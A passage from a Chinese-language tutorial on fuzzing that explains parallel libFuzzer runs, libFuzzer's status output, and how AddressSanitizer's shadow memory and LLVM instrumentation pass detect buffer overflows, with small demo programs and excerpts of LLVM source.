<li><strong>依赖库中的源码和被模糊测试的源码之间关联系不大</strong>.比如项目中引用了protobuf进行数据解析,然后具体的处理逻辑则是由项目处理,那么依赖库protobuf就不应该包含在模糊测试范围中.</li>
</ul>
<h4 id="如何并行执行多个libfuzzer"><a class="header" href="#如何并行执行多个libfuzzer">如何并行执行多个libFuzzer?</a></h4>
<p>libFuzzer默认只执行一个进程来做模糊测试.我们使用-jobs和-workers参数就能让libFuzzer创建多个<strong>进程</strong>并行执行.命令如下:</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ ./test_code -jobs=10
</code></pre>
<p><img src="./pic12/4.png" alt="" /></p>
<p>假设读者的电脑配置是4核8G内存的话,那么就会同时有两个进程在执行.如果要同时跑四个进程的话,那就设置为<code>-workers=4</code>,workers的值默认是当前CPU核数/2.</p>
<p>-jobs参数是指完成了n个libFuzzer进程之后就退出程序,默认值为0.如果我们要同时执行8个进程并行执行libFuzzer的命令如下:</p>
<pre><code class="language-sh">fuzzing@fuzzing-virtual-machine:~/Desktop/test_code$ ./test_code -jobs=8 -workers=8
</code></pre>
<p>需要特别注意的是,如果读者们要并行执行libFuzzer,jobs和workers参数的传值缺一不可.因为libFuzzer代码中的逻辑就是workers和jobs必须要大于0才可以执行并行多进程,所以这个隐藏的坑就是为什么只设置了<code>-workers=8</code>但是libFuzzer没有执行并行的原因,因为此时jobs值为默认为0.</p>
<p>还有一点值得提示一下,libFuzzer所做的模糊测试,实际上并没有尝试去维护<em>干净的上下文</em>然后重新模糊测试.笔者举个Qemu Fuzzer的例子来说明一下.</p>
<p>我们在对Qemu进行模糊测试时,会生成大量的MMIO和Port IO的方式来进行设备通信.那么大量的测试数据会导致Qemu设备的<em>状态不断发生改变,而不是从一个初始的状态开始执行</em>.比如说解析PE文件的接口,我们实例化类之后把文件内容传递到接口去测试,那么这个类都是从初始的状态去执行数据解析然后改变状态.但是对于Qemu虚拟机这样复杂的系统,它需要维护很多上下文相关的对象,所以每次模糊测试和设备交互时,都会对设备的状态进行改变,导致无法从<em>初始的状态</em>开始测试,影响最终复现漏洞的结果.为了解决这个问题,Qemu 5.2.0中支持的模糊测试方法是在libFuzzer LLVMFuzzerTestOneInput()中为TracePC创建共享内存,然后fork()出子进程执行模糊测试,父进程wait()等待子进程模糊测试结束,然后从共享内存中收集代码覆盖信息,回馈到libFuzzer核心逻辑中去.</p>
<p><img src="./pic12/11.png" alt="" /></p>
<h4 id="libfuzzer输出哪些信息怎么样根据这些信息优化fuzzer"><a class="header" href="#libfuzzer输出哪些信息怎么样根据这些信息优化fuzzer">libFuzzer输出哪些信息,怎么样根据这些信息优化Fuzzer?</a></h4>
<p>运行libFuzzer编译的程序,从启动到崩溃输出的信息如下:</p>
<p><img src="./pic12/5.png" alt="" /></p>
<p>第一行输出<code>INFO: Seed: 1410507973</code>,意思是当前的随机数种子的初始值.因为每一次执行libFuzzer随机数种子的值都是随机的,但是如果读者们想要复现libFuzzer模糊测试,那就需要使用参数<code>-seed</code>指定随机数种子的值.</p>
<p>第二行输出<code>INFO: Loaded 1 modules   (10 inline 8-bit counters): 10 [0x5a6ed0, 0x5a6eda)</code>,意思是显示当前libFuzzer中使用到的插桩方式(inline 8-bit counters)以及Edge分支信息的内存区域开始和结束信息(Start:0x5a6ed0,End:0x5a6eda,总分支数:10).第三行输出亦是同样意义.</p>
<p>第四行输出<code>INFO: -max_len is not provided; libFuzzer will not generate inputs larger than 4096 bytes</code>,意思是当前没有指定参数<code>-max_len</code>,默认max_len的值是4096字节(4K).max_len参数的意义在于限制libFuzzer生成的Data内容大小.有时候在对协议处理的功能进行模糊测试,那么max_len相对的取值是小一点的,但是对于文件处理的功能进行模糊测试,那么max_len有可能需要设置为100K,具体场景具体分析.</p>
<p>第五行输出<code>INFO: A corpus is not provided, starting from an empty corpus</code>,意思是没有指定输入样本,从空数据生成开始模糊测试.</p>
<p>第六行输出<code>#2	INITED cov: 2 ft: 2 corp: 1/1b exec/s: 0 rss: 31Mb</code>,意思是执行完所有初始样本输入数据,代码覆盖(cov字段)2个块(以BasicBlock或Edge为单位),2条执行路径(ft字段);每秒执行次数0(exec/s字段);内存占用为31 MB(rss字段).libFuzzer会对程序执行内存有限制,默认内存上限是2 GB.在模糊测试的过程中因为大量内存分配超出rss,那就会导致libFuzzer崩溃,记录当前样本到OOM-xxx文件,如果读者们需要控制libFuzzer的内存上限值,那就使用<code>-rss_limit_mb</code>参数(注意,内存泄露也记录在这个范畴中).</p>
<p>第七行输出<code>#1949	NEW    cov: 3 ft: 3 corp: 2/21b lim: 21 exec/s: 0 rss: 31Mb L: 20/20 MS: 2 InsertByte-InsertRepeatedBytes-</code>,意思是发现程序执行到新路径,此时代码覆盖3个块,3条执行路径;本次发现新路径时生成模糊测试数据大小为20字节(L字段);数据生成使用了2个数据变异模块串联生成(MS字段);所使用的模块顺序是InsertByte=&gt;InsertRepeatedBytes.</p>
<p>libFuzzer输出模糊测试状态时,每行的第二个字段代表的含义如下:</p>
<ul>
<li>
<p>READ ,意思是当前模糊测试阶段是从给定的样本文件夹中读取模糊测试数据来执行.</p>
</li>
<li>
<p>INITED ,意思是使用所有初始样本执行完LLVMFuzzerTestOneInput之后的状态信息.</p>
</li>
<li>
<p>NEW ,意思是发现新路径时的状态信息.</p>
</li>
<li>
<p>REDUCE ,意思是已经执行过的路径发现了更精简的输入.</p>
</li>
<li>
<p>RELOAD ,意思是从样本文件夹中发现并加载了新样本.</p>
</li>
<li>
<p>pulse ,没有什么特别的意义,就是定时告诉用户libFuzzer还在运行.</p>
</li>
<li>
<p>DONE ,libFuzzer执行结束.</p>
</li>
</ul>
<p>!!!!! 如何优化再补充一下~~~~</p>
<h2 id="asan原理"><a class="header" href="#asan原理">ASAN原理</a></h2>
<p>读过libFuzzer-workshop或者有libFuzzer使用经验的读者应该对以下的命令很熟悉</p>
<pre><code class="language-sh">clang++ -g openssl_fuzzer.cc -O2 -fno-omit-frame-pointer -fsanitize=address \
    -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-gep,trace-div \
    -Iopenssl1.0.1f/include openssl1.0.1f/libssl.a openssl1.0.1f/libcrypto.a \
    ../../libFuzzer/libFuzzer.a -o openssl_fuzzer
</code></pre>
<p>我们在引入libFuzzer时,还会引入ASAN(clang命令参数-fsanitize=address).也就是说,我们使用libFuzzer作为Fuzzer驱动,进行接口构造调用/数据生成/路径探测,然后使用ASAN作为内存异常检测工具.下面是使用ASAN的简单例子:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ cat ./test_case_2.c
#include &lt;stdio.h&gt;

int main() {
    char buffer[10] = {0};

    printf(&quot;Try Crash!\n&quot;);
    buffer[10] = 'C';
    printf(&quot;Oops \n&quot;);

    return 1;
}
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
Oops
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -fsanitize=address ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
=================================================================
==520651==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffeea008e8a at pc 0x0000004c5098 bp 0x7ffeea008e50 sp 0x7ffeea008e48
WRITE of size 1 at 0x7ffeea008e8a thread T0
    #0 0x4c5097 in main (/home/ubuntu/Desktop/instrument_note/test_case_2+0x4c5097)
    #1 0x7fbfa3d56cb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_2+0x41b2bd)

Address 0x7ffeea008e8a is located in stack of thread T0 at offset 42 in frame
    #0 0x4c4f5f in main (/home/ubuntu/Desktop/instrument_note/test_case_2+0x4c4f5f)
...
</code></pre>
<p>本章着重于探索ASAN的实现原理,关于ASAN的更深入用法建议参考官方文档(https://clang.llvm.org/docs/AddressSanitizer.html ;https://github.com/google/sanitizers/wiki/AddressSanitizer ).</p>
<h4 id="asan异常检测原理"><a class="header" href="#asan异常检测原理">ASAN异常检测原理</a></h4>
<p>使用前面的演示例子,当buffer越界时,它必然会修改越界后内存的数据(...虽然这句是废话,但还是要提一下).我们用gdb调试没有引入ASAN编译的示例代码:</p>
<pre><code class="language-text">(gdb) n
Try Crash!
10	    buffer[10] = 'C';
(gdb) info local
buffer = &quot;\000\000\000\000\000\000\000\000\000&quot;
(gdb) x /16x buffer
0x7fffffffdfb2:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffdfba:	0x00	0x00	0x00	0x00	0x00	0x00	0xa0	0x11
(gdb) n
12	    printf(&quot;Oops \n&quot;);
(gdb) x /16x buffer
0x7fffffffdfb2:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x7fffffffdfba:	0x00	0x00	0x43	0x00	0x00	0x00	0xa0	0x11
(gdb)
</code></pre>
<p>可以看到这里已经越界写数据成功了.一般地,我们要检测越界读写问题时,就需要专门创建一块内存用来做越界对比.下面的示例代码将引入检测逻辑:</p>
<pre><code class="language-c">#include &lt;memory.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

#define CHECK_MEMORY_LEFT_SIZE   (0x8)
#define CHECK_MEMORY_RIGHT_SIZE  (0x8)
#define CHECK_MEMORY_NORMAL_FLAG (0x00)
#define CHECK_MEMORY_EXCEPT_FLAG (0xFF)


void* create_check_memory(int buffer_size) {  // 创建内存映射,并且给这块映射内存两则边缘
    int real_buffer_size =
        CHECK_MEMORY_LEFT_SIZE + CHECK_MEMORY_RIGHT_SIZE + buffer_size;
    char* buffer = malloc(real_buffer_size);

    memset(buffer,CHECK_MEMORY_EXCEPT_FLAG,real_buffer_size);  // 填充异常Flag
    memset(&amp;buffer[CHECK_MEMORY_LEFT_SIZE],CHECK_MEMORY_NORMAL_FLAG,buffer_size);  // 内存中标识为正常值则说明这块区域是可以任意操作的

    return buffer;
}

void free_check_memory(void* buffer,int buffer_size) {  // 释放内存
    memset(buffer,CHECK_MEMORY_FREE_FLAG,
        CHECK_MEMORY_LEFT_SIZE + CHECK_MEMORY_RIGHT_SIZE + buffer_size);  // 不要free()释放,而是填充异常Flag,后续如果遇到UAF类漏洞就可以检测到
}

int is_overflow(void* buffer,int offset,int is_write) {  // 检测内存异常
    unsigned char data = ((unsigned char*)buffer)[CHECK_MEMORY_LEFT_SIZE + offset];

    if (CHECK_MEMORY_NORMAL_FLAG != data) {
        switch (data) {
            case CHECK_MEMORY_EXCEPT_FLAG:
                if (is_write)
                    printf(&quot; ==== Write OverFlow !! ====\n&quot;);
                else
                    printf(&quot; ==== Read OverFlow !! ====\n&quot;);

                break;
            case CHECK_MEMORY_FREE_FLAG:
                printf(&quot; ==== Use After Free !! ====\n&quot;);

                break;
            default:
                printf(&quot;Unknow Except\n&quot;);
        }
        exit(0);
    }
    return 0;
}

int main() {
    char buffer[10] = {0};
    char* shadow_buffer = create_check_memory(sizeof(buffer));  // 为buffer变量创建检测映射内存

    if (is_overflow(shadow_buffer,5,0))  // 向真实内存中写入数据之前先到检测内存中判断是否有异常
        exit(0);

    int data = buffer[5];  // 正常的读操作
    printf(&quot;Try Crash!\n&quot;);

    if (is_overflow(shadow_buffer,10,1))
        exit(0);

    buffer[10] = 'C';  // 异常的写操作
    printf(&quot;Oops \n&quot;);
    free_check_memory(shadow_buffer,sizeof(buffer));

    return 1;
}
</code></pre>
<p>运行结果如下:</p>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -g ./test_case_2.c -o ./test_case_2 &amp;&amp; ./test_case_2
Try Crash!
 ==== Write OverFlow !! ====
ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$
</code></pre>
<p>这短短几十行代码就是ASAN异常检测的核心原理,它包含了:</p>
<ul>
<li>
<p>每个缓冲区中对应的异常检测内存,对应的是ASAN的Shadow Table概念.</p>
</li>
<li>
<p>每个异常检测内存中都会插入正常/异常标识,对应的是ASAN的投毒(Poison)概念.</p>
</li>
<li>
<p>每次进行真实内存操作之前必须获取异常检测内存的内容,判断该地址是否被投毒过,对应的是ASAN的插桩检测概念.</p>
<p>聪明的读者可能会提出这个疑问:因为在异常检测内存的左边和右边八字节范围的内存被污染过,如果读写的偏移足够大,是不是检测逻辑就失效了呢?很遗憾,确实会存在这样的问题.</p>
</li>
</ul>
<pre><code class="language-text">(gdb) x /8x buffer
0x4052a0:	0xffffffff	0xffffffff	0x00000000	0x00000000
0x4052b0:	0xffff0000	0xffffffff	0x0000ffff	0x00000000
</code></pre>
<p>笔者在现实场景中遇到ASAN也存在这样的问题.</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

int main(void) {
    char buffer[10] = {0};

    printf(&quot;no crash!\n&quot;);
    buffer[0x1001] = 0xFF;

    printf(&quot;crash!\n&quot;);
    buffer[10] = 0xFF;

    return 0;
}
</code></pre>
<pre><code class="language-sh">ubuntu@ubuntu-virtual-machine:~/Desktop/instrument_note$ clang -g -fsanitize=address ./test_case_3.c -o ./test_case_3 &amp;&amp; ./test_case_3
no crash!
crash!
=================================================================
==521485==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7fffb261710a at pc 0x0000004c50f9 bp 0x7fffb26170d0 sp 0x7fffb26170c8
WRITE of size 1 at 0x7fffb261710a thread T0
    #0 0x4c50f8 in main /home/ubuntu/Desktop/instrument_note/./test_case_3.c:12:16
    #1 0x7f54faa5dcb1 in __libc_start_main csu/../csu/libc-start.c:314:16
    #2 0x41b2bd in _start (/home/ubuntu/Desktop/instrument_note/test_case_3+0x41b2bd)

Address 0x7fffb261710a is located in stack of thread T0 at offset 42 in frame
    #0 0x4c4f5f in main /home/ubuntu/Desktop/instrument_note/./test_case_3.c:5

...
</code></pre>
<p>理解核心原理之后,接下来就探索LLVM怎么样实现ASAN.在深入ASAN实现之前,我们必须要知道的一点就是:ASAN分为两部分,插桩(Instrumentation Pass)和运行时逻辑(Compiler-RT).</p>
<p>代码插桩负责:</p>
<ul>
<li>
<p>在代码中符合条件的数据操作之前插入异常检测逻辑.</p>
</li>
<li>
<p>引入对全局/栈空间的检测逻辑.</p>
<p>运行时逻辑负责:</p>
</li>
<li>
<p>内存分配/投毒逻辑</p>
</li>
<li>
<p>内存操作hook</p>
</li>
<li>
<p>...</p>
<p>明白这些概念之后,直接逆向简单的ASAN插桩后的程序,代码如下:</p>
</li>
</ul>
<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp){
  if ( _asan_option_detect_stack_use_after_return )
    v24 = (_QWORD *)_asan_stack_malloc_3(0LL, (__asan *)0x180);
  stack_point = v24;
  if ( !v24 )
    stack_point = (_QWORD *)((unsigned __int64)(&amp;v11 - 48) &amp; 0xFFFFFFFFFFFFFFE0LL);
  stack_point_ = (unsigned __int64)stack_point;
  v25 = stack_point;
  *stack_point = 0x41B58AB3LL;                  // 填充栈开始Magic Code
  *(_QWORD *)(stack_point_ + 8) = &quot;1 32 272 4 test&quot;;
  *(_QWORD *)(stack_point_ + 0x10) = main;
  shadow_memory = stack_point_ &gt;&gt; 3;
  *(_QWORD *)(shadow_memory + 0x7FFF8000) = 0xF8F8F8F8F1F1F1F1LL; // 对ShadowTable中分配的栈内存进行投毒
  *(_QWORD *)(shadow_memory + 0x7FFF8008) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8010) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8018) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8020) = 0xF3F3F8F8F8F8F8F8LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8028) = 0xF3F3F3F3F3F3F3F3LL;
  v26 = 0;
  *(_QWORD *)(shadow_memory + 0x7FFF8004) = 0LL; // 初始化可用栈区域
  *(_QWORD *)(shadow_memory + 0x7FFF800C) = 0LL;
  *(_QWORD *)(shadow_memory + 0x7FFF8014) = 0LL;
  *(_QWORD *)(shadow_memory + 0x7FFF801C) = 0LL;
  *(_WORD *)(shadow_memory + 0x7FFF8024) = 0;
  v7 = *(_BYTE *)(((unsigned __int64)(real_data_ + 0x22) &gt;&gt; 3) + 0x7FFF8000);
  v13 = (unsigned __int64)(real_data_ + 0x22);  // 计算偏移,获取到ShadowTable中的内存
  v12 = v7;
  if ( v7 )  // ASAN内存异常检测插桩判断,内存中是0值表示为正常内存,可以使用,如果为非0值那就认为是被污染过的
    _asan_report_store1(v13);  // 提示报错
  *(_BYTE *)v13 = -1;  // 写入真实内存,注意,ShadowTable中的数据全部都是标识这块内存是否被污染过,用了什么方式污染,并不会保存真实的数据到ShadowTable中,所以它才被称为影子页表.
  v8 = v21;
  *(_QWORD *)((char *)v21 + 4) = 0xF8F8F8F8F8F8F8F8LL;  // 释放栈时不是直接free(),而是填充Stack use after标志
  *(_QWORD *)((char *)v8 + 12) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)((char *)v8 + 20) = 0xF8F8F8F8F8F8F8F8LL;
  *(_QWORD *)((char *)v8 + 28) = 0xF8F8F8F8F8F8F8F8LL;
  *((_WORD *)v8 + 18) = -1800;

  return 0;
</code></pre>
<h4 id="编译时插桩原理"><a class="header" href="#编译时插桩原理">编译时插桩原理</a></h4>
<p>ASAN的插桩原理比SanitizerCoverage复杂得多,为了容易理解,后续分析实现过程时会省略很多细节.ASAN的插桩过程简单来说就是:</p>
<ol>
<li>筛选合适的指令</li>
<li>填充插桩代码</li>
<li>进行栈平衡</li>
</ol>
<p>整体的逻辑示意图如下,先理解过程之后再带着印象去探索源码才能事半功倍:</p>
<p><img src="C:%5CUsers%5CFremy%5CDesktop%5Cvm%5Cinstrument%5Cpic12%5CAsan-Arch.png" alt="" /></p>
<p>ASAN的实现代码在\llvm-project\llvm\lib\Transforms\Instrumentation\AddressSanitizer.cpp.遍历每个函数进行插桩的入口点在<code>AddressSanitizer::instrumentFunction()</code>函数.</p>
<pre><code class="language-c++">bool AddressSanitizer::instrumentFunction(Function &amp;F,const TargetLibraryInfo *TLI) {
  // 省略代码
  SmallVector&lt;InterestingMemoryOperand, 16&gt; OperandsToInstrument;
  SmallVector&lt;MemIntrinsic *, 16&gt; IntrinToInstrument;
  SmallVector&lt;BasicBlock *, 16&gt; AllBlocks;
  int NumAllocas = 0;
  // 这些Vector用于保存筛选出来的指令对象和信息

  for (auto &amp;BB : F) {  // 遍历BasicBlock
    AllBlocks.push_back(&amp;BB);
    for (auto &amp;Inst : BB) {  // 遍历指令
      SmallVector&lt;InterestingMemoryOperand, 1&gt; InterestingOperands;
      getInterestingMemoryOperands(&amp;Inst, InterestingOperands);

      if (!InterestingOperands.empty()) {  // 如果当前指令属于需要插桩的位置,那就记录一下,后面会用到
        for (auto &amp;Operand : InterestingOperands) {
          OperandsToInstrument.push_back(Operand);
        }
      } else if (MemIntrinsic *MI = dyn_cast&lt;MemIntrinsic&gt;(&amp;Inst)) {  // memset/memcpy/memmove操作
        IntrinToInstrument.push_back(MI);
      }
    }
  }

  // ...

  for (auto &amp;Operand : OperandsToInstrument) {  // 对数据访问指令进行操作
    instrumentMop(ObjSizeVis, Operand, UseCalls,
                    F.getParent()-&gt;getDataLayout());
    FunctionModified = true;
  }
  for (auto Inst : IntrinToInstrument) {  // 对内存操作指令进行操作
    instrumentMemIntrinsic(Inst);
    FunctionModified = true;
  }

  FunctionStackPoisoner FSP(F, *this);
  bool ChangedStack = FSP.runOnFunction();  // 对插桩之后的函数进行栈调整

  // ...

  return FunctionModified;
}

void AddressSanitizer::getInterestingMemoryOperands(
    Instruction *I, SmallVectorImpl&lt;InterestingMemoryOperand&gt; &amp;Interesting) {
  if (LoadInst *LI = dyn_cast&lt;LoadInst&gt;(I)) {  // LLVM IR Load指令,用于读取数据
    if (ignoreAccess(LI-&gt;getPointerOperand()))  // 判断指令中的操作数是否为指针
      return;
    Interesting.emplace_back(I, LI-&gt;getPointerOperandIndex(), false,
                             LI-&gt;getType(), LI-&gt;getAlign());
  } else if (StoreInst *SI = dyn_cast&lt;StoreInst&gt;(I)) {  // LLVM IR Store指令,用于保存数据
    if (ignoreAccess(SI-&gt;getPointerOperand()))
      return;
    Interesting.emplace_back(I, SI-&gt;getPointerOperandIndex(), true,
                             SI-&gt;getValueOperand()-&gt;getType(), SI-&gt;getAlign());
  }
}
</code></pre>
<p>获得筛选出来的指令后,接下来就进行插桩操作.下面的插桩核心原理,就是在<strong>Load/Store</strong>指令前面插入异常检测逻辑,如果没有异常才可以执行真实的数据读写操作.</p>
<pre><code class="language-c++">void AddressSanitizer::instrumentMop(ObjectSizeOffsetVisitor &amp;ObjSizeVis,InterestingMemoryOperand &amp;O, bool UseCalls,const DataLayout &amp;DL) {
  Value *Addr = O.getPtr();  // 获取指令操作的指针地址

   // ...

  unsigned Granularity = 1 &lt;&lt; Mapping.Scale;  // 内存检测粒度,后续再详解

  doInstrumentAddress(this, O.getInsn(), O.getInsn(), Addr, O.Alignment,
                  Granularity, O.TypeSize, O.IsWrite, nullptr, UseCalls,
                  Exp);
}

static void doInstrumentAddress(AddressSanitizer *Pass, Instruction *I,
                                Instruction *InsertBefore, Value *Addr,
                                MaybeAlign Alignment, unsigned Granularity,
                                uint32_t TypeSize, bool IsWrite,
                                Value *SizeArgument, bool UseCalls,
                                uint32_t Exp) {
  if ((TypeSize == 8 || TypeSize == 16 || TypeSize == 32 || TypeSize == 64 ||
       TypeSize == 128) &amp;&amp;
      (!Alignment || *Alignment &gt;= Granularity || *Alignment &gt;= TypeSize / 8))
    return Pass-&gt;instrumentAddress(I, InsertBefore, Addr, TypeSize, IsWrite,
                                   nullptr, UseCalls, Exp);  // 如果当前指令的访问方式是按字节大小访问的话(char,short,long,uint64_t这些方式)
  Pass-&gt;instrumentUnusualSizeOrAlignment(I, InsertBefore, Addr, TypeSize,
                                         IsWrite, nullptr, UseCalls, Exp);
}

void AddressSanitizer::instrumentAddress(Instruction *OrigIns,Instruction *InsertBefore, Value *Addr,uint32_t TypeSize, bool IsWrite,Value *SizeArgument, bool UseCalls,uint32_t Exp) {
  bool IsMyriad = TargetTriple.getVendor() == llvm::Triple::Myriad;

  IRBuilder&lt;&gt; IRB(InsertBefore);  // LLVM IR指令生成器
  Value *AddrLong = IRB.CreatePointerCast(Addr, IntptrTy);
  size_t AccessSizeIndex = TypeSizeToSizeIndex(TypeSize);

  Type *ShadowTy =
      IntegerType::get(*C, std::max(8U, TypeSize &gt;&gt; Mapping.Scale));
  Type *ShadowPtrTy = PointerType::get(ShadowTy, 0);
  Value *ShadowPtr = memToShadow(AddrLong, IRB);
  Value *CmpVal = Constant::getNullValue(ShadowTy);
  Value *ShadowValue =
      IRB.CreateLoad(ShadowTy, IRB.CreateIntToPtr(ShadowPtr, ShadowPtrTy));

  Value *Cmp = IRB.CreateICmpNE(ShadowValue, CmpVal);
  Instruction *CrashTerm = nullptr;

   /*
   上面这段指令生成的意思是创建if判断:
  shadow_page_flag = *(_BYTE *)((((unsigned __int64)real_data + 0x1001) &gt;&gt; 3) + 0x7FFF8000);
  real_data_offset = (unsigned __int64)real_data + 0x1001;
   if ( shadow_page_flag )  // ASAN内存异常检测插桩判断
   */

  CrashTerm = SplitBlockAndInsertIfThen(Cmp, InsertBefore, !Recover);
  Instruction *Crash = generateCrashCode(CrashTerm, AddrLong, IsWrite, AccessSizeIndex, SizeArgument, Exp);

   /*
   上面这段指令生成的意思是if判断成功时,在它的子BasicBlock中创建函数调用:
    _asan_report_store1(v13);  // 提示报错

   所以合并起来插桩代码就是:
  shadow_page_flag = *(_BYTE *)((((unsigned __int64)real_data + 0x1001) &gt;&gt; 3) + 0x7FFF8000);
  real_data_offset = (unsigned __int64)real_data + 0x1001;
   if ( shadow_page_flag )  // ASAN内存异常检测插桩判断
    _asan_report_store1(real_data_offset);  // 提示报错
   */
}
</code></pre>
<p>对所有关键位置进行插入了异常判断后,最后一步就是调整函数的栈空间,把ShadowTable的分配和销毁引入进来.</p>
<pre><code class="language-c++">bool AddressSanitizer::instrumentFunction() {
   // ...
   FunctionStackPoisoner FSP(F, *this);
   bool ChangedStack = FSP.runOnFunction();
   // ...
}

bool runOnFunction() {
   // ...
   // 遍历函数中所有指令,筛选出内存分配操作
   for (BasicBlock *BB : depth_first(&amp;F.getEntryBlock())) visit(*BB);
   // ...
   processDynamicAllocas();
   processStaticAllocas();
   // ...

   return true;
}

void visitAllocaInst(AllocaInst &amp;AI) {  // 遍历指令时遇到AllocaInst,它的意义是在栈内分配指定大小内存
  if (!AI.isStaticAlloca())  // 只要在当前函数声明的变量,无论在if/switch/while/for里面哪个BasicBlock,编译时都会把这块内存的申请放到函数的入口BasicBlock中.isStaticAlloca的用意就在于判断这个AllocInst是否在当前函数的入口BasicBlock中执行,而且还判断AllocInst创建的内存大小的值是否会变而不是指定的大小.
    DynamicAllocaVec.push_back(&amp;AI);
  else
    AllocaVec.push_back(&amp;AI);
}

void visitIntrinsicInst(IntrinsicInst &amp;II) {
  bool DoPoison = (ID == Intrinsic::lifetime_end);
  AllocaPoisonCall APC = {&amp;II, AI, SizeValue, DoPoison};
  if (AI-&gt;isStaticAlloca())  // 同上
    StaticAllocaPoisonCallVec.push_back(APC);  // 记录栈中分配对象大小和偏移信息
  else if (ClInstrumentDynamicAllocas)
    DynamicAllocaPoisonCallVec.push_back(APC);
}
</code></pre>
<p><code>processDynamicAllocas()</code>的逻辑就不深入探索了,我们主要研究的是<code>processStaticAllocas()</code>函数的实现.</p>
<pre><code class="language-c++">void FunctionStackPoisoner::processStaticAllocas() {
  // ...
  Instruction *InsBefore = AllocaVec[0];
  IRBuilder&lt;&gt; IRB(InsBefore);  // 在函数的第一个AllocaInst指令前插入新代码

  SmallVector&lt;ASanStackVariableDescription, 16&gt; SVD;
  SVD.reserve(AllocaVec.size());
  for (AllocaInst *AI : AllocaVec) {  // 遍历所有在函数入口点声明的AllocaInst指令,收集这些AllocaInst指令的信息
    ASanStackVariableDescription D = {AI-&gt;getName().data(),
                                      ASan.getAllocaSizeInBytes(*AI),
                                      0,
                                      AI-&gt;getAlignment(),
                                      AI,
                                      0,
                                      0};
    SVD.push_back(D);
  }

  size_t Granularity = 1ULL &lt;&lt; Mapping.Scale;  // 内存粒度,后面再具体说明
  size_t MinHeaderSize = std::max((size_t)ASan.LongSize / 2, Granularity);
  const ASanStackFrameLayout &amp;L =
      ComputeASanStackFrameLayout(SVD, Granularity, MinHeaderSize);  // 调整ASAN插桩后的整个栈布局
  uint64_t LocalStackSize = L.FrameSize;  // 获取调整之后的栈布局大小

  Value *StaticAlloca =
      DoDynamicAlloca ? nullptr : createAllocaForLayout(IRB, L, false);  // 调整新栈空间,这块栈内存是真实使用的
  Value *FakeStack;
  Value *LocalStackBase;
  Value *LocalStackBaseAlloca;
  uint8_t DIExprFlags = DIExpression::ApplyOffset;

  LocalStackBaseAlloca =
      IRB.CreateAlloca(IntptrTy, nullptr, &quot;asan_local_stack_base&quot;);
  Constant *OptionDetectUseAfterReturn = F.getParent()-&gt;getOrInsertGlobal(
      kAsanOptionDetectUseAfterReturn, IRB.getInt32Ty());
  Value *UseAfterReturnIsEnabled = IRB.CreateICmpNE(
      IRB.CreateLoad(IRB.getInt32Ty(), OptionDetectUseAfterReturn),
      Constant::getNullValue(IRB.getInt32Ty()));
  Instruction *Term =
      SplitBlockAndInsertIfThen(UseAfterReturnIsEnabled, InsBefore, false);
  IRBuilder&lt;&gt; IRBIf(Term);
  StackMallocIdx = StackMallocSizeClass(LocalStackSize);
  assert(StackMallocIdx &lt;= kMaxAsanStackMallocSizeClass);
  Value *FakeStackValue =
      IRBIf.CreateCall(AsanStackMallocFunc[StackMallocIdx],
                       ConstantInt::get(IntptrTy, LocalStackSize));
  IRB.SetInsertPoint(InsBefore);
  FakeStack = createPHI(IRB, UseAfterReturnIsEnabled, FakeStackValue, Term,
                        ConstantInt::get(IntptrTy, 0));

  Value *NoFakeStack =
      IRB.CreateICmpEQ(FakeStack, Constant::getNullValue(IntptrTy));
  Term = SplitBlockAndInsertIfThen(NoFakeStack, InsBefore, false);
  IRBIf.SetInsertPoint(Term);
  Value *AllocaValue =
      DoDynamicAlloca ? createAllocaForLayout(IRBIf, L, true) : StaticAlloca;

  IRB.SetInsertPoint(InsBefore);
  LocalStackBase = createPHI(IRB, NoFakeStack, AllocaValue, Term, FakeStack);
  IRB.CreateStore(LocalStackBase, LocalStackBaseAlloca);
  // 生成的插桩代码等价于:
  // void *FakeStack = __asan_option_detect_stack_use_after_return
  //     ? __asan_stack_malloc_N(LocalStackSize)
  //     : nullptr;
  // void *LocalStackBase = (FakeStack) ? FakeStack : alloca(LocalStackSize);
  // 意思是从ShadowTable中分配一块栈内存,这块栈内存是用于异常检测的.__asan_stack_malloc_N()的实现代码在Compiler-RT.

  Value *LocalStackBaseAllocaPtr =
      isa&lt;PtrToIntInst&gt;(LocalStackBaseAlloca)
          ? cast&lt;PtrToIntInst&gt;(LocalStackBaseAlloca)-&gt;getPointerOperand()
          : LocalStackBaseAlloca;  // 获取ShadowTable中的栈起始地址

  for (const auto &amp;Desc : SVD) {  // 根据AllocaInst的申请栈分配内存大小和位置,在ShadowTable中重新调整到对应的位置
    AllocaInst *AI = Desc.AI;
    Value *NewAllocaPtr = IRB.CreateIntToPtr(
        IRB.CreateAdd(LocalStackBase, ConstantInt::get(IntptrTy, Desc.Offset)),
        AI-&gt;getType());
    AI-&gt;replaceAllUsesWith(NewAllocaPtr);
  }

  // 这些插桩代码都不太重要,意义就是在ShadowTable中创建的栈内存记录当前函数的信息
